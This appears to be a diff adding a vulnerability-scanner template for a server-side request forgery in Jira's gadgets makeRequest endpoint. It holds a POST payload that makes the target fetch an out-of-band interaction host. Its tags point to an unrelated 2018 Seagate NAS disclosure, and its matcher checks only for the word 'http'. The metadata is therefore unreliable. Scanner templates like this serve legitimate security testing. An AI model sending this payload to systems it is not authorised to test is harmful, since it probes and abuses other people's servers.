@@ -1,0 +1,28 @@
+id: Jira-SSRF
+
+info:
+  name: Jira Server-Side Request Forgery
+  author: SSRF跨站请求伪造
+  severity: high
+  description: Jira Server-Side Request Forgery vulnerability.
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-200
+  tags: cve,cve2018,seagate,nasos,disclosure,ssrf
+
+requests:
+  - method: POST
+    path:
+      - '{{BaseURL}}/jira/plugins/servlet/gadgets/makeRequest'
+
+    body: |
+      url=https://{{Host}}:443@{{interactsh-url}}
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'http'
+
+# Enhanced by mp on 2022/07/05
